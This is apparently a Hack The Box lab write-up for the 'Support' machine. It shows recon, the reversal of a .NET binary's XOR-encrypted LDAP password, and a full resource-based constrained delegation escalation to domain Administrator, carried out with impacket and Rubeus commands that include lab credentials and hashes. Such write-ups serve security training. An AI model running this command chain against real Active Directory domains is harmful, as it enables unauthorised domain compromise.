# Support Write-Up - HTB

## Recon

Running a full port nmap stealth scan reveals that this is built like a DC:

```bash
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49674/tcp open  unknown
49686/tcp open  unknown
49691/tcp open  unknown
49709/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 113.94 seconds
```

## Enumeration

### SMB:

Further enumeration targets are LDAP and SMB.

Starting of with SMB, by running NMAP Scripts over it:

```bash
PORT    STATE SERVICE       VERSION
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds?
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-21T15:43:43
|_  start_date: N/A
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:0:0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:0:2: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:1:1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
|_smb-vuln-ms10-054: false
|_smb-print-text: false
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-protocols: 
|   dialects: 
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.56 seconds
```

It turns out that we could enumerate a share via smb:

<figure><img src="../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

I ran an `mget *` and started running strings over the binaries, but the most interesting one is the UserInfo binary, that's for sure!

### Reverse Engineering .NET Binary:

`UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections`&#x20;

This is a .NET binary, so I got ILSpy on my KaliBox and started reversing:

```bash
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip

mkdir ILSpy
mv *.zip
cd ILSpy
unzip *
unzip ILSpy-linux-x64-Release.zip
cd 
./ILSpy
```

Load up the binary and start scavenging.\
This is what we are looking for:\


<figure><img src="../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

### Reverse Engineering the Encryption Function:

\
We have function:\


<figure><img src="../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

\
We have string variable enc\_password which is base64.\
We have byte array variable key which is taking ASCII string armando and turns it into a string of bytes.\
We have function getPassword() which:

* Has a byte array variable array that converts the enc\_password from base64 to a string of bytes.
* Has a byte array variable called array2 that is set to the length of array and it's identical. This will serve for storing the decrypted bytes.
* Starts a for loop from 0 to array.length:
  * In this for loop each object of the array2 is:
    * `(byte)(uint)` Type Conversions: first it goes to uint then back to bytes.
    * `key[i % key.Length]` This takes the key variable which holds 'armando' and loops through it using modulo operator with i.
    * `array[i] ^ key[i % key.Length]` This is the first XOR operation, it compares the bytes of the array and the key.
    * `^ 0xDF` This is the second XOR operation, it adds another layer of security.
* After processing all bytes, the function converts the entire decrypted byte array back to a string using the default encoding and returns it.

### Explaining XOR Operation, Logic Gate:

A practical example of why this works:\
XOR Logic cancels itself out or self-reverts:

```bash
10110101 (original value)
⊕ 11001100 (key)
  ---------
  01111001 (encrypted result)
```

```bash
01111001 (encrypted result)
⊕ 11001100 (same key as before)
  ---------
  10110101 (original value restored!)
```

This is a fairly simple formula to encrypt a password, that utilizes the basic XOR gate.\
XOR is just a boolean logic gate: ((a and Not(b)) or (Not(a) and b)). Boolean Algebra, introduced by George Boole in the 19th Century.

```hdl
/**
 * Exclusive-or gate:
 * if ((a and Not(b)) or (Not(a) and b)) out = 1, else out = 0
 */
CHIP Xor {
    IN a, b;
    OUT out;

    PARTS:
    Not(in=a, out=notA);
    Not(in=b, out=notB);

    And(a=notA, b=b, out=notAandB);
    And(a=a, b=notB, out=AandnotB);

    Or(a=notAandB, b=AandnotB, out=out);
    
}
```

We can verify this works by testing all possible combinations:

* When a=0, b=0: ((0 and Not(0)) or (Not(0) and 0)) = ((0 and 1) or (1 and 0)) = (0 or 0) = 0
* When a=0, b=1: ((0 and Not(1)) or (Not(0) and 1)) = ((0 and 0) or (1 and 1)) = (0 or 1) = 1
* When a=1, b=0: ((1 and Not(0)) or (Not(1) and 0)) = ((1 and 1) or (0 and 0)) = (1 or 0) = 1
* When a=1, b=1: ((1 and Not(1)) or (Not(1) and 1)) = ((1 and 0) or (0 and 1)) = (0 or 0) = 0

So, to recap:

* We have base64 string;
* We have bytes array of key;
* We convert base64 to a string of bytes and store in array;
* We define function to XOR each array byte with each key byte;
* We XOR the result of the previous operation with the constant value 0xDF;
* Convert the byte array back to base64 to get the encrypted string.

To decrypt:

* Convert the result string back to byte array;
* For each byte in the encrypted array:
  * XOR it with the corresponding byte from the key (cycling through the key)
  * XOR the result with 0xDF
* Convert the final byte array to a string to get the original password

Remember XORing is an associative operation, meaning that the order of operations does not matter!

Let's say we've got the original byte P, the key byte K and the constant 0xDF, C;

```bash
Encrypted = (P ^ K) ^ C
```

```bash
Decrypted = (Encrypted ^ K) ^ C
		  = (((P ^ K) ^ C) ^ K) ^ C
```

Now, due to XOR's properties:

* K ^ K cancels out to 0
* Any value XORed with 0 remains unchanged
* C ^ C cancels out to 0

```bash
Decrypted = P ^ (K ^ K) ^ (C ^ C)
          = P ^ 0 ^ 0
          = P
```

### Finding the Username:

Now we've got our password, but what's the username? Of course, I tried `armando` ! Doesn't work :D\
So... I checked the LdapQuery function, we've got our answer:\
\
There is a DirectoryEntry constructor that states the protocol://adress, username, password.

<figure><img src="../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

### Bloodhound:

Now I ran bloodhound:

<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

### LDAP:

\
I think this box is super related to LDAP now, decided to run few ldap queries:

```bash
ldapsearch -x -H ldap://10.10.11.174 -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(sAMAccountName=support)" "*"
```



<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

## Foothold

We just got ourselves a plain-text password :) for the user support. Now, remember WinRM is on. Let's use that to connect.`evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'`&#x20;

## PrivEsc - RBCD

This a RBCD Attack, for more info please check [this ](../knowledge-base/windows-and-ad/attacks/role-based-constrained-delegation-attack.md)article.

### Requirements:

Once we are on the box, I loaded up SharpHound. We have GenericAll over the DC through our group and we also have `SeMachineAccountPrivilege Add workstations to domain Enabled`

```
C:\Users\support\Downloads>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### Launching the attack:

We will now abuse our SeMachineAccountPrivilege to add a new computer in the domain. We will use impacket-addcomputer for it:

```bash
python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -computer-name 'ATTACKCOMPUTER$' -computer-pass 'AttackPassword123' -dc-ip 10.10.11.174 'support.htb/support:Ironside47pleasure40Watchful'
```

Now, let's use our GenericAll rights to write an attribute to the DC to include a DACL where we can delegate from our ATTACKCOMPUTER$ to the DC:

```bash
python3 /usr/share/doc/python3-impacket/examples/rbcd.py -action write -delegate-from 'ATTACKCOMPUTER$' -delegate-to 'DC$' -dc-ip 10.10.11.174 'support.htb/support:Ironside47pleasure40Watchful'
```

Now let's go on the target host where we transferred Rubeus and check our hash:

```
.\Rubeus.exe hash /password:AttackPassword123 /user:ATTACKCOMPUTER$ /domain:support.htb
```

Use this hash now to request a TGT ticket

```powershell
.\Rubeus.exe asktgt /user:ATTACKCOMPUTER$ /rc4:753F0A7DFD2413A969F14855C6E5832F /domain:support.htb /dc:dc.support.htb /nowrap
```

Now use this TGT to request a TGS for CIFS.

```
.\Rubeus.exe s4u /user:ATTACKCOMPUTER$ /rc4:753F0A7DFD2413A969F14855C6E5832F /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /dc:dc.support.htb /ptt
```

Take this base64 hash:

```
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
```

Trim the spaces, decode and do:

```bash
Impacket-ticketConverter ticket_decoded.kirbi ticket.ccache
```

Add dc.support.htb to /etc/hosts

```bash
export KRB5CCNAME=ticket.ccache
```

```bash
impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
```

<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
